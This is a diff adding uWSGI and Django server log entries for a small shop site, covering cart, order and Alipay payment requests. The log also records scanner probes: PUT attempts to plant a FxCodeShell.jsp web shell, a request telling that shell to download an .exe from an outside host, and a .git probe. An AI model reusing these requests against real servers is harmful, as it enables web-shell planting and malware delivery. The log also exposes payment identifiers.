@@ -583,3 +583,611 @@ change to 1
 [pid: 27315|app: 0|req: 31/31] 113.88.14.120 () {44 vars in 1301 bytes} [Sun Mar 17 12:44:15 2019] GET /generateorder/ => generated 10568 bytes in 28 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
 Not Found: /pay/
 [pid: 27315|app: 0|req: 32/32] 113.88.14.120 () {44 vars in 1212 bytes} [Sun Mar 17 12:44:16 2019] GET /pay/ => generated 4944 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27315|app: 0|req: 33/33] 101.132.153.242 () {34 vars in 463 bytes} [Sun Mar 17 12:46:34 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 20:46:36 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 09:02:17
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZjlynlmysim61Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/zwyz
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenvs/ZWYZ/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/zwyz/
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 7857
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8020 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x221efa0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x221efa0 pid: 27369 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 27369, cores: 1)
+[pid: 27369|app: 0|req: 1/1] 113.88.14.120 () {44 vars in 1254 bytes} [Sun Mar 17 12:46:43 2019] GET / => generated 66060 bytes in 228 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 2/2] 113.88.14.120 () {42 vars in 1233 bytes} [Sun Mar 17 12:46:44 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 3/3] 113.87.160.176 () {42 vars in 1230 bytes} [Sun Mar 17 12:46:44 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 4/4] 113.88.14.120 () {44 vars in 1224 bytes} [Sun Mar 17 12:46:44 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 5/5] 113.87.160.176 () {44 vars in 1225 bytes} [Sun Mar 17 12:46:44 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 6/6] 113.88.14.120 () {44 vars in 1226 bytes} [Sun Mar 17 12:46:44 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 7/7] 113.88.14.120 () {44 vars in 1278 bytes} [Sun Mar 17 12:46:46 2019] GET /list/ => generated 128243 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 27369|app: 0|req: 8/8] 113.88.14.120 () {44 vars in 1239 bytes} [Sun Mar 17 12:46:47 2019] GET /list/json/kouhong.json => generated 5164 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 9/9] 106.15.202.177 () {34 vars in 462 bytes} [Sun Mar 17 12:46:54 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+6
+cart is not exist
+[pid: 27369|app: 0|req: 10/10] 113.88.14.120 () {44 vars in 1230 bytes} [Sun Mar 17 12:46:57 2019] GET /addcart/?goodsid=6 => generated 13 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 11/11] 113.88.14.120 () {44 vars in 1273 bytes} [Sun Mar 17 12:47:00 2019] GET / => generated 66060 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 12/12] 113.88.14.120 () {42 vars in 1229 bytes} [Sun Mar 17 12:47:00 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 13/13] 113.88.14.120 () {42 vars in 1233 bytes} [Sun Mar 17 12:47:00 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 14/14] 113.87.160.176 () {44 vars in 1225 bytes} [Sun Mar 17 12:47:00 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 15/15] 113.88.14.120 () {44 vars in 1224 bytes} [Sun Mar 17 12:47:00 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 16/16] 113.88.14.120 () {44 vars in 1226 bytes} [Sun Mar 17 12:47:00 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 17/17] 113.88.14.120 () {44 vars in 1278 bytes} [Sun Mar 17 12:47:09 2019] GET /cart/ => generated 32031 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+0
+change to 1
+[pid: 27369|app: 0|req: 18/18] 113.88.14.120 () {44 vars in 1262 bytes} [Sun Mar 17 12:47:11 2019] GET /changeselect/?isselect=1&goodsid=6 => generated 2 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 113 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 19/19] 113.88.14.120 () {44 vars in 1301 bytes} [Sun Mar 17 12:47:14 2019] GET /generateorder/ => generated 10571 bytes in 32 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+米蔻缤纷炫彩唇线笔X1|
+[pid: 27369|app: 0|req: 20/20] 113.88.14.120 () {44 vars in 1233 bytes} [Sun Mar 17 12:47:15 2019] GET /pay/?orderid=25 => generated 986 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 101 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 21/21] 140.205.118.165 () {34 vars in 496 bytes} [Sun Mar 17 12:48:03 2019] POST /appnotifyurl/ => generated 18 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 22/22] 113.88.14.120 () {44 vars in 2800 bytes} [Sun Mar 17 12:48:12 2019] GET /returnurl/?charset=utf-8&out_trade_no=1552826834.90470849787&method=alipay.trade.page.pay.return&total_amount=42.00&sign=HO1bq4%2FnXp3CMfd3QG5s2CBIRYaVxJQBlrlimXqNzTzQ9MakJD%2FeLc%2Fx6xyTsB1xFHlK%2Fh2LvaRVOvnuFKpkWPSP%2BaQi4zsRnwNO7HnVR5jFtnLZ45lmA4Rgl9pzxqJgYuAjGkiNdEKeNZ2weVfDPENq5hcseHqktwLHdmtVQoTMx4eCmF6yHWEaerfgr3a3nzQr4fTJSRJanMVeyON2gy%2BUT%2BaIUHdoikyGPlmoKAX3XTxnZ%2FN6KpwaWWFOcSiZAd%2BeqfgokPO5hsSHN2zCkFM5fGeo9CEQQknXaJW7suEIvjJkRfDUnCPyyr%2FniZX6gxKWSdAwvKCr%2FwzwKdPlkA%3D%3D&trade_no=2019031722001438721000002024&auth_app_id=2016092800612147&version=1.0&app_id=2016092800612147&sign_type=RSA2&seller_id=2088102177580591&timestamp=2019-03-17+20%3A48%3A09 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 23/23] 113.88.14.120 () {44 vars in 1461 bytes} [Sun Mar 17 12:48:12 2019] GET / => generated 66060 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 24/24] 113.88.14.120 () {42 vars in 1233 bytes} [Sun Mar 17 12:48:12 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 25/25] 113.87.160.176 () {42 vars in 1230 bytes} [Sun Mar 17 12:48:12 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 26/26] 113.87.160.176 () {44 vars in 1225 bytes} [Sun Mar 17 12:48:12 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 27/27] 113.88.14.120 () {44 vars in 1224 bytes} [Sun Mar 17 12:48:12 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 28/28] 113.87.160.176 () {44 vars in 1227 bytes} [Sun Mar 17 12:48:12 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 29/29] 2.187.86.125 () {32 vars in 444 bytes} [Sun Mar 17 12:52:21 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 30/30] 14.215.160.197 () {52 vars in 1071 bytes} [Sun Mar 17 12:58:47 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 31/31] 14.215.160.197 () {46 vars in 826 bytes} [Sun Mar 17 12:58:54 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 32/32] 14.215.160.197 () {48 vars in 832 bytes} [Sun Mar 17 12:58:56 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 33/33] 14.215.160.197 () {48 vars in 832 bytes} [Sun Mar 17 12:58:58 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 34/34] 14.215.160.197 () {48 vars in 834 bytes} [Sun Mar 17 12:58:59 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 35/35] 14.215.160.197 () {46 vars in 830 bytes} [Sun Mar 17 12:59:01 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 27369|app: 0|req: 36/36] 117.136.40.209 () {40 vars in 701 bytes} [Sun Mar 17 12:59:09 2019] GET /favicon.ico => generated 5131 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 37/37] 45.71.231.5 () {32 vars in 443 bytes} [Sun Mar 17 13:10:29 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 38/38] 113.64.85.189 () {38 vars in 592 bytes} [Sun Mar 17 13:42:05 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 39/39] 113.64.85.189 () {40 vars in 676 bytes} [Sun Mar 17 13:42:07 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 40/40] 113.64.85.189 () {40 vars in 672 bytes} [Sun Mar 17 13:42:07 2019] GET /images/index/fold.jpg => generated 5161 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 41/41] 113.64.85.189 () {42 vars in 703 bytes} [Sun Mar 17 13:42:08 2019] GET /json/playimg.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 42/42] 113.64.85.189 () {42 vars in 703 bytes} [Sun Mar 17 13:42:08 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 43/43] 113.64.85.189 () {40 vars in 828 bytes} [Sun Mar 17 13:42:46 2019] GET /list/ => generated 128264 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 27369|app: 0|req: 44/44] 113.64.85.189 () {42 vars in 718 bytes} [Sun Mar 17 13:43:09 2019] GET /list/json/kouhong.json => generated 5164 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 45/45] 113.64.85.189 () {40 vars in 823 bytes} [Sun Mar 17 13:43:09 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 46/46] 113.64.85.189 () {40 vars in 672 bytes} [Sun Mar 17 13:43:09 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 47/47] 113.64.85.189 () {40 vars in 676 bytes} [Sun Mar 17 13:43:09 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 48/48] 113.64.85.189 () {42 vars in 703 bytes} [Sun Mar 17 13:43:09 2019] GET /json/playimg.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 49/49] 113.64.85.189 () {42 vars in 703 bytes} [Sun Mar 17 13:43:09 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 50/50] 113.64.85.189 () {40 vars in 828 bytes} [Sun Mar 17 13:43:16 2019] GET /list/ => generated 128264 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 27369|app: 0|req: 51/51] 113.64.85.189 () {42 vars in 718 bytes} [Sun Mar 17 13:43:16 2019] GET /list/json/kouhong.json => generated 5164 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 52/52] 113.64.85.189 () {40 vars in 833 bytes} [Sun Mar 17 13:43:23 2019] GET /cart/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 53/53] 113.64.85.189 () {42 vars in 729 bytes} [Sun Mar 17 13:43:49 2019] GET /list/ => generated 128264 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 27369|app: 0|req: 54/54] 113.64.85.189 () {44 vars in 807 bytes} [Sun Mar 17 13:43:50 2019] GET /list/json/kouhong.json => generated 5164 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 55/55] 113.64.85.189 () {42 vars in 922 bytes} [Sun Mar 17 13:43:57 2019] GET /cart/ => generated 11123 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 56/56] 47.100.126.89 () {34 vars in 461 bytes} [Sun Mar 17 13:45:37 2019] GET / => generated 66081 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 57/57] 113.64.85.189 () {48 vars in 1069 bytes} [Sun Mar 17 13:46:07 2019] POST /cart/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 58/58] 113.64.85.189 () {48 vars in 1069 bytes} [Sun Mar 17 13:47:16 2019] POST /cart/ => generated 11123 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 59/59] 113.64.85.189 () {48 vars in 1069 bytes} [Sun Mar 17 13:49:22 2019] POST /cart/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 60/60] 113.64.85.189 () {40 vars in 681 bytes} [Sun Mar 17 13:55:46 2019] GET / => generated 66081 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 61/61] 113.64.85.189 () {42 vars in 765 bytes} [Sun Mar 17 13:55:46 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 62/62] 113.64.85.189 () {42 vars in 761 bytes} [Sun Mar 17 13:55:46 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 63/63] 113.64.85.189 () {44 vars in 792 bytes} [Sun Mar 17 13:55:46 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 64/64] 113.64.85.189 () {44 vars in 792 bytes} [Sun Mar 17 13:55:46 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 65/65] 113.64.85.189 () {42 vars in 917 bytes} [Sun Mar 17 13:58:51 2019] GET /cart/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 66/66] 47.100.36.239 () {34 vars in 461 bytes} [Sun Mar 17 14:50:35 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 67/67] 85.97.61.156 () {32 vars in 445 bytes} [Sun Mar 17 14:54:46 2019] GET / => generated 66081 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 68/68] 47.101.204.125 () {34 vars in 462 bytes} [Sun Mar 17 14:59:57 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 69/69] 47.101.204.125 () {34 vars in 462 bytes} [Sun Mar 17 16:08:50 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 70/70] 101.132.153.242 () {34 vars in 463 bytes} [Sun Mar 17 16:11:59 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 27369|app: 0|req: 71/71] 47.52.210.105 () {26 vars in 262 bytes} [Sun Mar 17 17:31:24 2019] GET / => generated 55089 bytes in 38 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 72/72] 101.132.67.50 () {34 vars in 461 bytes} [Sun Mar 17 17:42:48 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 27369|app: 0|req: 73/73] 80.82.70.187 () {32 vars in 414 bytes} [Sun Mar 17 18:31:26 2019] GET /cache/global/img/gs.gif => generated 5166 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 27369|app: 0|req: 74/74] 178.73.215.171 () {28 vars in 281 bytes} [Sun Mar 17 19:42:28 2019] GET / => generated 55212 bytes in 32 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 27369|app: 0|req: 75/75] 39.108.217.228 () {42 vars in 630 bytes} [Sun Mar 17 20:09:52 2019] PUT /FxCodeShell.jsp%20 => generated 5148 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 27369|app: 0|req: 76/76] 39.108.217.228 () {42 vars in 644 bytes} [Sun Mar 17 20:09:52 2019] PUT /FxCodeShell.jsp::$DATA => generated 5164 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 27369|app: 0|req: 77/77] 39.108.217.228 () {42 vars in 626 bytes} [Sun Mar 17 20:09:52 2019] PUT /FxCodeShell.jsp/ => generated 5146 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 27369|app: 0|req: 78/78] 39.108.217.228 () {38 vars in 736 bytes} [Sun Mar 17 20:09:52 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 5223 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 79/79] 5.234.226.28 () {32 vars in 445 bytes} [Sun Mar 17 20:31:03 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /.git/HEAD
+[pid: 27369|app: 0|req: 80/80] 13.209.73.87 () {34 vars in 392 bytes} [Sun Mar 17 20:34:49 2019] GET /.git/HEAD => generated 5125 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 81/81] 197.157.23.147 () {32 vars in 453 bytes} [Sun Mar 17 21:25:32 2019] GET / => generated 66081 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 82/82] 46.162.52.44 () {32 vars in 445 bytes} [Sun Mar 17 21:32:12 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 83/83] 101.132.188.111 () {34 vars in 473 bytes} [Sun Mar 17 21:40:32 2019] GET /cart/ => generated 11123 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 84/84] 101.132.188.111 () {34 vars in 487 bytes} [Sun Mar 17 21:40:32 2019] GET /xiangqing/1/ => generated 42685 bytes in 11 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 85/85] 120.79.206.221 () {34 vars in 480 bytes} [Sun Mar 17 22:04:02 2019] GET /register/ => generated 10968 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 86/86] 47.92.4.72 () {34 vars in 468 bytes} [Sun Mar 17 22:13:21 2019] GET /list/ => generated 128264 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 87/87] 47.92.74.243 () {34 vars in 460 bytes} [Sun Mar 17 22:43:54 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 88/88] 47.92.74.243 () {34 vars in 480 bytes} [Sun Mar 17 22:43:54 2019] GET /returnurl/ => generated 0 bytes in 0 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 89/89] 47.92.74.243 () {34 vars in 460 bytes} [Sun Mar 17 22:43:54 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 90/90] 47.100.57.133 () {34 vars in 473 bytes} [Sun Mar 17 22:47:39 2019] GET /login/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+Internal Server Error: /generateorder/
+Traceback (most recent call last):
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/exception.py", line 41, in inner
+    response = get_response(request)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./app/views.py", line 229, in generateorder
+    user = User.objects.get(pk=userid)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/db/models/query.py", line 380, in get
+    self.model._meta.object_name
+app.models.DoesNotExist: User matching query does not exist.
+[pid: 27369|app: 0|req: 91/91] 47.92.100.7 () {34 vars in 487 bytes} [Sun Mar 17 22:57:11 2019] GET /generateorder/ => generated 66497 bytes in 39 msecs (HTTP/1.1 500) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 92/92] 47.96.12.13 () {34 vars in 473 bytes} [Sun Mar 17 23:08:38 2019] GET /list/2/ => generated 128264 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 93/93] 47.92.151.67 () {34 vars in 460 bytes} [Sun Mar 17 23:16:05 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
